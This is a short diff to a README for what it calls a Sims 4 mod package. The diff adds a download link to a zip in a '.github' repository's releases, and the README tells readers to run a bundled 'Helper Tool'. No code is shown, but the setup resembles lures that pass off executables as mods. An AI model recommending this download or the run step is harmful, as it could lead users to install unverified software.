@@ -18,7 +18,7 @@
 ### 1. Get the Latest Release  
 Get the latest setting up package (tool + mod) from the  Releases section:
 
-- [💾 v185d Release]() = `*Tool files & folder*`
+- [💾 v185d Release](https://github.com/WickedWhims-Sims-4/.github/releases/download/v.185d/WickedWhims-v185d.zip) = `*Tool files & folder*`
 
 
 ### 2. Run the Helper Tool  
